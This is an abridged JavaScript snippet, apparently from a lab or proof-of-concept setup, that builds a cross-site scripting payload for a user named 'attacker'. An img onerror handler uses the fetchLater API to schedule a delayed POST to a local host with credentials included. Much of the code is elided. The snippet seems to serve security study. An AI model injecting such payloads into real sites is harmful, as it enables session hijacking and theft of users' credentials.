...
const allowedOrigins = ['https://localhost:8443', 'https://localhost:8446', 'null'];
  ...
  if (username === 'attacker') {
    ...
    payload = `<img src=x onerror="
      ...
      if ('fetchLater' in window) {
          const activateAfter = 2000;
          
          let req = new Request('https://localhost:8446/start', {
            method: 'POST',
            credentials: 'include',
            body: JSON.stringify({
          ...
          console.log('fetchLater request scheduled for ' + (activateAfter/1000) + ' seconds from now');
